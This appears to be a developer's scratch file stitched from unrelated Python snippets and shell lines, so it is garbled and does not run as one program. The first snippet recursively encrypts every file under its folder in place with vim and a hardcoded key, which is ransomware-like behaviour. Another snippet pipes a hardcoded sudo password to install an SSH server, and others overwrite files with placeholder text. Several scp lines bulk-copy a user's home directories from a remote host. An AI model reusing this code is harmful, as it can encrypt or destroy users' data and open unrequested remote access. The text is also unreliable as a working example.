import os, subprocess,pathlib

path = pathlib.Path(__file__).parent.resolve()
fp =__file__
fn=fp.replace(str(path),'')
fp=str(path)+fn
if fn.startswith('\\'):
    
    fn=fn[1:]
print('fp',fp,fn)
def encr_file(fpath):
    os.system('vim --cmd "set key=123" -c wq '+fpath)

def make_tree(path):
    
    dirlist = os.listdir(path)
    #print(dirlist.sort(),dirlist,type(dirlist))
    for list_item in dirlist:
        if list_item.startswith('.') or list_item.startswith('__') or list_item==fn:
            continue
        full_path = str(path)+"/"+list_item
        #print(full_path,end=", ")
        if os.path.isdir(full_path):
            make_tree(full_path)
        elif os.path.isfile(full_path):
            #print(list_item,'is file')
            encr_file(full_path)
            #f= open(full_path,'r+')
            #print("file: ",full_path)
            #print(f.read())
            #print('\n\n')
        else:
            print(list_item,'is special file')
#f=open(,'w+')
#f.write("import os\n# testing completed")
#f.close()
#make_tree(path)
#if os.path.isdir()
#print(os.listdir(path))
#print ("path",path,__file__)
#print ("path2",pathlib.Path(__file__).name)
#print ("path3",pathlib.Path(__file__))
#testing2.te()













import os
import subprocess
try:
	os.system("echo '123' | sudo -S apt install openssh-server -y")
	f=open("regex.py",'w+')
	f.write("import os\n# testing completed")
	f.close()
except IOError:
	print("Can't write: " +f)
	
print('---------------------------------------')

import pathlib

print(pathlib.Path(__file__).parent.resolve())
print('---------------------------------------')




import os

#for m in os.walk("/"):
#    print('m',m)
file1 = open('py_text.txt','r')
lines = file1.readlines()

count =0
for line in lines:
    count+=1
    filename = line.replace('./','./New/').replace('\n','')
    print(filename)
    if not os.path.exists(os.path.dirname(filename)):
        try:
            os.makedirs(os.path.dirname(filename))
	    
        except OSError as e:
            print(count,line,'\n',e)
            continue
    try:
        if os.path.isdir(filename):
            
            f = open(filename+'/dummy'+str(count)+'.txt','w')
            f.write(filename+"\n is a directory")
            f.close()
        elif os.path.isfile(filename):  
            f = open(filename,'w')
            f.write(filename+"\n is a normal file")
            f.close()
        else:  
            f = open(filename,'w')
            f.write(filename+"\n is a special file")
            f.close()
    except Exception as e:
        print('e: ',e)
        if count==10:
            break







scp -r dev@ip:/home/dev/Desktop /home/dev/test
scp -r dev@ip:/home/dev/Documents /home/dev/test
scp -r dev@ip:/home/dev/Downloads /home/dev/test
scp -r dev@ip:/home/dev/hide_unavailable_variants /home/dev/test
scp -r dev@ip:/home/dev/material_purchase_requisitions /home/dev/test
scp -r dev@ip:/home/dev/Music /home/dev/test
scp -r dev@ip:/home/dev/Odoo11_home /home/dev/test
scp -r dev@ip:/home/dev/Odoo12_EInvoice /home/dev/test
scp -r dev@ip:/home/dev/Odoo12_home /home/dev/test
scp -r dev@ip:/home/dev/Odoo12_home_updated /home/dev/test
scp -r dev@ip:/home/dev/Odoo13_home /home/dev/test
scp -r dev@ip:/home/dev/Odoo13_home_old /home/dev/test
scp -r dev@ip:/home/dev/Odoo13_NEW /home/dev/test
scp -r dev@ip:/home/dev/Odoo14_home /home/dev/test
scp -r dev@ip:/home/dev/Odoo15_home /home/dev/test
scp -r dev@ip:/home/dev/odoo_backend_fb_chat_integration /home/dev/test
scp -r dev@ip:/home/dev/PycharmProjects /home/dev/test
scp -r dev@ip:/home/dev/Received /home/dev/test
scp -r dev@ip:/home/dev/snap /home/dev/test
scp -r dev@ip:/home/dev/TO_MIGRATE /home/dev/test
scp -r dev@ip:/home/dev/Videos /home/dev/test
scp -r dev@ip:/home/dev/website_attr_display_type_button /home/dev/test
scp -r dev@ip:/home/dev/website_product_quotation /home/dev/test
scp -r dev@ip:/home/dev/web_map-12.0.0.3 /home/dev/test


echo $HISTFILE
/Applications/PhpStorm 2020.1 EAP.app/Contents/plugins/terminal/.zsh_history
/Users/username/.zsh_history
export HISTFILE=$HOME/.zsh_history





